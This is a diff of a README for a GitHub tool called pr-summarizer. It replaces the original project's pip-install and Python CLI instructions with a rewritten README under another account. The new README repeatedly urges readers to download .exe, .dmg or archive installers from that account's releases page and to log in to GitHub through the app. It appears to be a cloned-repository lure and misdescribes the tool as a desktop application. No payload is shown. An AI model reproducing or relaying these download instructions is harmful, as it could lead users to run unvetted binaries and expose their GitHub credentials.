@@ -1,85 +1,83 @@
-# PR Summarizer
+# 🤖 pr-summarizer - Effortless Summaries for Pull Requests
 
-[![Python](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/) [![GitHub stars](https://img.shields.io/github/stars/yksanjo/pr-summarizer?style=social)](https://github.com/yksanjo/pr-summarizer/stargazers) [![GitHub forks](https://img.shields.io/github/forks/yksanjo/pr-summarizer.svg)](https://github.com/yksanjo/pr-summarizer/network/members) [![GitHub issues](https://img.shields.io/github/issues/yksanjo/pr-summarizer.svg)](https://github.com/yksanjo/pr-summarizer/issues)
-[![Last commit](https://img.shields.io/github/last-commit/yksanjo/pr-summarizer.svg)](https://github.com/yksanjo/pr-summarizer/commits/main)
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/guycrespin/pr-summarizer/releases)
 
+## 📖 Overview
 
-Automatically generates TL;DR summaries of GitHub Pull Requests to speed up code review.
+pr-summarizer helps you review code faster. It automatically generates concise summaries of GitHub Pull Requests. By analyzing files and commits, it brings you useful risk assessments and suggests reviewers. This tool saves time and improves your code review process.
 
-## Features
+## 🚀 Getting Started
 
-- Analyzes PR files, commits, and descriptions
-- Generates concise summaries with:
-  - Files changed + purpose
-  - Risk level assessment
-  - Suggested reviewers
-- Supports OpenAI and Ollama (local LLM)
-- CLI and web interface
+To begin using pr-summarizer, follow these simple steps:
 
-## Installation
+1. **Visit the Releases Page**: Head over to our [Releases page](https://github.com/guycrespin/pr-summarizer/releases) to find the latest version of pr-summarizer.
+2. **Choose Your Version**: Look for the most recent release version. Click the link to download it.
+3. **Download the File**: Once on the releases page, download the appropriate file for your operating system. This file will typically end with `.exe`, `.zip`, or other relevant extensions.
 
-```bash
-pip install -r requirements.txt
-```
+## 💻 System Requirements
 
-## Setup
+pr-summarizer works on various operating systems. Here are the typical requirements:
 
-1. Get a GitHub Personal Access Token:
-   - Go to GitHub Settings → Developer settings → Personal access tokens
-   - Create a token with `repo` scope
+- **Windows**: Windows 10 or newer
+- **Mac**: macOS 10.15 (Catalina) or newer
+- **Linux**: Ubuntu 18.04 or newer
 
-2. Set up API keys (create `.env` file):
-```env
-GITHUB_TOKEN=your_github_token_here
-OPENAI_API_KEY=your_openai_key_here  # Optional, for OpenAI provider
-OLLAMA_BASE_URL=http://localhost:11434  # Optional, for Ollama provider
-```
+Make sure your system meets these requirements for the best experience.
 
-## Usage
+## 🔧 Download & Install
 
-### CLI Mode
+To download and install pr-summarizer, follow these steps:
 
-```bash
-# Summarize a PR
-python summarize_pr.py owner/repo 123
+1. **Visit the Releases Page**: Click [here](https://github.com/guycrespin/pr-summarizer/releases) to go to the releases page.
+2. **Download the Installer**: Select the appropriate installer for your operating system.
+3. **Run the Installer**: 
+    - **For Windows**: Double-click the downloaded `.exe` file and follow the prompts.
+    - **For Mac**: Open the `.dmg` file and drag the pr-summarizer application into your Applications folder.
+    - **For Linux**: Use the terminal to extract the `.tar.gz` file and follow the installation instructions included in the repository.
+4. **Launch the Application**: After installation, find pr-summarizer in your applications and launch it.
 
-# Using OpenAI
-python summarize_pr.py owner/repo 123 --provider openai
+## 🎉 Using pr-summarizer
 
-# Using Ollama (local)
-python summarize_pr.py owner/repo 123 --provider ollama
+Using pr-summarizer is straightforward. Here’s how to get started:
 
-# Save to file
-python summarize_pr.py owner/repo 123 --output summary.md
-```
+1. **Open pr-summarizer**: Launch the application on your device.
+2. **Connect to GitHub**: Log in to your GitHub account through the application.
+3. **Select a Pull Request**: Navigate to the Pull Requests section of your repository.
+4. **Generate Summary**: Choose a Pull Request and click the 'Generate Summary' button. pr-summarizer will analyze the content and provide a clear summary, including risk assessments and suggestions on reviewers.
+5. **Review the Output**: Review the generated summary. You can adjust your code review process based on the insights provided.
 
-### Web Interface
+## ⚙️ Features
 
-```bash
-python app.py
-```
+pr-summarizer includes a range of useful features:
 
-Then open http://localhost:5002 in your browser.
+- **Automatic Summaries**: Quickly generate summaries of Pull Requests.
+- **Risk Assessments**: Get insights on the potential risks involved.
+- **Suggested Reviewers**: Improve collaboration by identifying suitable reviewers.
+- **File Analysis**: Review all files changed in the Pull Request.
 
-### Python API
+## 🔍 Troubleshooting
 
-```python
-from summarize_pr import summarize_pr
+If you encounter any issues while using pr-summarizer, here are a few quick tips:
 
-summary = summarize_pr("owner/repo", 123, provider="openai")
-print(summary)
-```
+- **Check Permissions**: Ensure the application has the necessary permissions to access your GitHub repositories.
+- **Update Your Version**: Make sure you're running the latest version. Older versions may not have the latest features.
+- **Consult the Documentation**: Visit the [Documentation](https://github.com/guycrespin/pr-summarizer/wiki) for more detailed guidance.
 
-## Output Format
+## 🤝 Getting Help
 
-The summary includes:
-- **TL;DR**: One-line summary
-- **Files Changed**: List of modified files with purpose
-- **Risk Level**: Low/Medium/High with reasoning
-- **Suggested Reviewers**: Based on file ownership
-- **Key Changes**: Major modifications
-- **Testing Notes**: Suggestions for testing
+Need further assistance? You can find help through the following channels:
 
-## License
+- **GitHub Issues**: Report any bugs or issues directly on the [GitHub Issues page](https://github.com/guycrespin/pr-summarizer/issues).
+- **Community Forum**: Join discussions and seek help from other users on our community forum.
 
-MIT
+## 📢 Contribution
+
+We welcome contributions. If you want to help improve pr-summarizer, please check our [Contributing Guidelines](https://github.com/guycrespin/pr-summarizer/blob/main/CONTRIBUTING.md) for details on how to get involved.
+
+## 📄 License
+
+pr-summarizer is licensed under the MIT License. This allows you to use, copy, and modify the software. For more details, please refer to the [License file](https://github.com/guycrespin/pr-summarizer/blob/main/LICENSE).
+
+[![Download Again](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/guycrespin/pr-summarizer/releases)
+
+Thank you for choosing pr-summarizer. Enjoy streamlined code reviews!
